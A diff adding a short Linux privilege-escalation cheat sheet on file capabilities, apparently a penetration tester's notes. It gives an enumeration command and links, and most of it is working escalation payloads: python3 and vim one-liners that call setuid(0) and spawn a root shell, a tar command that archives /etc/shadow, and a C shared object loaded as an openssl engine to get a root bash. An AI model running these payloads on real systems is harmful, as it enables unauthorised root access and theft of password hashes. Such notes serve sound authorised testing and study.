@@ -1,0 +1,31 @@
+### CAPABILITIES ###
+## links
+https://nxnjz.net/2018/08/an-interesting-privilege-escalation-vector-getcap/
+https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/
+https://gtfobins.github.io/
+
+## command
+getcap -r / 2>/dev/null
+
+## Example
+/home/python3 = cap_setuid+ep
+/home/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+
+/home/tar = cap_dac_read_search+ep
+/home/tar -cvf shadow.tar /etc/shadow
+
+./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+
+## openssl
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+    setuid(0);
+    system("/bin/bash");
+}
+> gcc -fPIC -shared -o setuid.so setuid.c -nostartfiles
+> openssl req -engine ./setuid.so
+
+
